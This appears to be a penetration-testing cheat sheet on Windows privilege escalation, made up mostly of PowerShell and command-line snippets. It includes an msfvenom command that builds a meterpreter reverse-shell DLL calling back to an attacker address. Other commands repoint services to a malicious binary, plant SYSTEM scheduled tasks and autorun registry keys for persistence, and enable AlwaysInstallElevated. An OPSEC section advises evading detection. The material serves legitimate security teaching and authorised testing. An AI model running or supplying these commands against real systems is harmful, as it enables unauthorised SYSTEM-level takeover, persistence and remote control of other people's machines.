# Windows Privilege Escalation

### Overview

Privilege escalation in Windows involves techniques to gain higher-level access, typically from a normal user to SYSTEM or Domain Admin privileges.

### Kernel Exploits

#### 1. System Information

```powershell
# OS Version
systeminfo
Get-WmiObject -Class Win32_OperatingSystem

# Hotfixes
wmic qfe list
Get-HotFix

# Architecture
wmic os get osarchitecture
[Environment]::Is64BitOperatingSystem
```

#### 2. Exploit Search

```powershell
# Manual Search
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
systeminfo | findstr /B /C:"Hotfix(s)"

# Automated Tools
.\windows-exploit-suggester.py --database 2021-03-23-mssb.xls --systeminfo systeminfo.txt
.\Sherlock.ps1 -Command "Find-AllVulns"
```

#### 3. Exploit Execution

```powershell
# Compile Exploit
cl.exe /EHsc exploit.cpp
link.exe exploit.obj

# Run Exploit
.\exploit.exe
```

### Service Exploitation

#### 1. Service Enumeration

```powershell
# List Services
Get-Service
Get-WmiObject -Class Win32_Service

# Service Permissions
Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\*" | Format-List
Get-Service | Get-Member -MemberType Property
```

#### 2. Service Misconfiguration

```powershell
# Unquoted Service Path
Get-WmiObject -Class Win32_Service | Where-Object { $_.PathName -notlike '"*"' -and $_.PathName -like '* *' }

# Weak Service Permissions
Get-Service | ForEach-Object { $service = $_; $acl = Get-Acl "HKLM:\System\CurrentControlSet\Services\$($service.Name)"; if ($acl.Access.FileSystemRights -match 'Write|Modify') { $service.Name } }
```

#### 3. Service Manipulation

```powershell
# Modify Service
sc.exe config <service> binPath= "C:\path\to\malicious.exe"
sc.exe config <service> obj= "LocalSystem"

# Start Service
sc.exe start <service>
Start-Service -Name <service>
```

### DLL Hijacking

#### 1. DLL Search Order

```powershell
# Check DLL Search Order
Get-ChildItem -Path $env:Path -Recurse -Filter *.dll
Get-ChildItem -Path "C:\Windows\System32" -Filter *.dll

# Find Missing DLLs
Get-EventLog -LogName System -Source "Service Control Manager" | Where-Object { $_.Message -like "*DLL*" }
```

#### 2. DLL Injection

```powershell
# Create Malicious DLL
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f dll -o malicious.dll

# Inject DLL
rundll32.exe malicious.dll,EntryPoint
```

### Scheduled Tasks

#### 1. Task Enumeration

```powershell
# List Tasks
schtasks /query /fo LIST /v
Get-ScheduledTask
Get-WmiObject -Class Win32_ScheduledJob

# Task Permissions
Get-ScheduledTask | ForEach-Object { $task = $_; $acl = Get-Acl "C:\Windows\System32\Tasks\$($task.TaskName)"; if ($acl.Access.FileSystemRights -match 'Write|Modify') { $task.TaskName } }
```

#### 2. Task Creation

```powershell
# Create Task
schtasks /create /tn "Update" /tr "C:\path\to\malicious.exe" /sc onlogon /ru SYSTEM
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\malicious.exe") -Trigger (New-ScheduledTaskTrigger -AtLogon) -Principal (New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount) | Register-ScheduledTask -TaskName "Update"
```

### Registry Exploitation

#### 1. Registry Enumeration

```powershell
# AutoRun Keys
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# AlwaysInstallElevated
Get-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
Get-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated
```

#### 2. Registry Modification

```powershell
# Add AutoRun
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\path\to\malicious.exe"

# Enable AlwaysInstallElevated
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -Value 1
Set-ItemProperty -Path "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" -Name AlwaysInstallElevated -Value 1
```

### Tools

#### 1. Primary Tools

* PowerUp
* WinPEAS
* Sherlock
* Windows-Exploit-Suggester
* Seatbelt

#### 2. Additional Tools

* PowerSploit
* Empire
* Covenant
* Cobalt Strike
* Sliver

### Best Practices

#### 1. Escalation Strategy

* Start with low-risk techniques
* Use multiple methods
* Document findings
* Test safely
* Follow engagement scope

#### 2. OPSEC Considerations

* Use stealth techniques
* Avoid detection
* Monitor for alerts
* Use legitimate tools
* Follow engagement scope

### Resources

* [HackTricks Windows](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [Red Team Notes](https://www.ired.team/offensive-security/privilege-escalation)
* [MITRE ATT\&CK](https://attack.mitre.org/tactics/TA0004/)

***

_Last Updated: 2025-03-23_
